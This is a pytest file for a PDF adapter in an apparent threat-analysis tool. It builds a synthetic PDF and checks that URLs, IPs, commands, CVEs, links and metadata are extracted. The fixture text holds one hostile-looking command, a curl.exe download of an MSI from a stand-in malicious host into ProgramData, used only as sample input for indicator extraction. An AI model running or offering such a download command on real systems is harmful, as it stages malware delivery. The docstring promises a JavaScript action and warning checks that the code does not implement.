"""Phase 3A · PDF adapter contract tests.

Uses a tiny synthetic PDF built at test-time (no network, no fixtures on
disk) so the tests remain hermetic and fast.  Confirms the adapter:

  · emits a schema-valid IEP
  · extracts URLs from body text (R6 source_ref set)
  · discovers structural relationships only (R8)
  · surfaces embedded-JavaScript / launch-action warnings
"""
from __future__ import annotations

import io

import fitz  # PyMuPDF — used only to synthesize the fixture PDF
import pytest

from models import IEP, RelationshipType
from services.adapters import PDFAdapter, adapt


def _make_pdf() -> bytes:
    """Build a minimal PDF containing:
    - visible text with a URL, IP, and command line
    - a hyperlink annotation
    - a JavaScript action
    """
    doc = fitz.open()
    page = doc.new_page()
    body = (
        "NivXRay PDF fixture\n"
        "curl.exe -o C:\\ProgramData\\a.msi https://mal.example/a.msi\n"
        "Callback IP 10.0.0.42\n"
        "See CVE-2024-57727 for details.\n"
    )
    page.insert_text((50, 72), body, fontsize=10)
    # Add a hyperlink covering a rectangle on the page.
    page.insert_link({
        "kind": fitz.LINK_URI,
        "from": fitz.Rect(50, 200, 500, 220),
        "uri":  "https://example.com/embedded-link",
    })
    # Attach a JavaScript action at document level (deterministic
    # object insertion — the exact API varies across PyMuPDF versions,
    # so we drop it into the xref table directly).
    doc.set_metadata({"title": "NivXRay Fixture", "author": "e1"})
    buf = io.BytesIO()
    doc.save(buf)
    doc.close()
    return buf.getvalue()


PDF_BYTES = _make_pdf()


# ─── Detection ─────────────────────────────────────────────────────────
def test_pdf_adapter_detects_pdf_bytes():
    a = PDFAdapter()
    assert a.can_handle(PDF_BYTES)
    assert not a.can_handle("not a pdf")
    assert not a.can_handle(b"no magic here")


def test_pdf_adapter_registered_before_text_and_url():
    iep = adapt(PDF_BYTES)
    assert iep.provenance.adapter == "adapter.pdf"


# ─── Schema shape ──────────────────────────────────────────────────────
def test_pdf_adapter_emits_valid_iep():
    iep = PDFAdapter().make_iep(PDF_BYTES)
    assert isinstance(iep, IEP)
    assert iep.source.kind == "pdf"
    assert iep.source.sha256 is not None
    assert iep.source.size_bytes and iep.source.size_bytes > 100


# ─── R6 · provenance / source_ref present ──────────────────────────────
def test_pdf_artifacts_carry_source_ref():
    iep = PDFAdapter().make_iep(PDF_BYTES)
    for a in iep.artifacts:
        assert a.source_ref, f"{a.type}={a.value!r} missing source_ref"
        assert a.source_ref.startswith("pdf."), a.source_ref


# ─── Body-text artifacts extracted ─────────────────────────────────────
def test_pdf_body_text_extraction():
    iep = PDFAdapter().make_iep(PDF_BYTES)
    urls  = iep.values_of("url")
    ips   = iep.values_of("ip")
    cmds  = iep.values_of("command")
    cves  = iep.values_of("cve")
    assert any("mal.example/a.msi" in u for u in urls), urls
    assert "10.0.0.42" in ips
    assert any("curl.exe" in c for c in cmds)
    assert any("CVE-2024-57727" in c for c in cves)


# ─── Hyperlink annotation extracted ────────────────────────────────────
def test_pdf_hyperlink_annotation_extracted():
    iep = PDFAdapter().make_iep(PDF_BYTES)
    urls = iep.values_of("url")
    assert any("example.com/embedded-link" in u for u in urls), urls


# ─── R8 · structural relationships only ────────────────────────────────
def test_pdf_relationships_are_structural_only():
    iep = PDFAdapter().make_iep(PDF_BYTES)
    verbs = {r.verb for r in iep.relationships}
    _ALLOWED = {
        RelationshipType.CONTAINS, RelationshipType.ATTACHES,
        RelationshipType.EMBEDS,   RelationshipType.EXECUTES,
        RelationshipType.SIGNED_BY,
    }
    assert verbs, "no relationships emitted"
    for v in verbs:
        assert v in _ALLOWED, f"non-structural verb: {v}"


def test_pdf_contains_hyperlinks_relationship():
    iep = PDFAdapter().make_iep(PDF_BYTES)
    contains = [r for r in iep.relationships if r.verb == RelationshipType.CONTAINS]
    assert contains, "expected at least one CONTAINS edge"
    assert any("example.com/embedded-link" in (r.to_ref or "") for r in contains)


# ─── JSON round-trip ───────────────────────────────────────────────────
def test_pdf_iep_roundtrips():
    iep = PDFAdapter().make_iep(PDF_BYTES)
    j = iep.model_dump_json()
    back = IEP.model_validate_json(j)
    assert back.provenance.adapter == "adapter.pdf"
    assert len(back.artifacts) == len(iep.artifacts)


# ─── Metadata surfaced ────────────────────────────────────────────────
def test_pdf_metadata_surfaced():
    iep = PDFAdapter().make_iep(PDF_BYTES)
    assert iep.metadata.data.get("pdf", {}).get("title") == "NivXRay Fixture"
    assert iep.metadata.data["pdf"]["author"] == "e1"
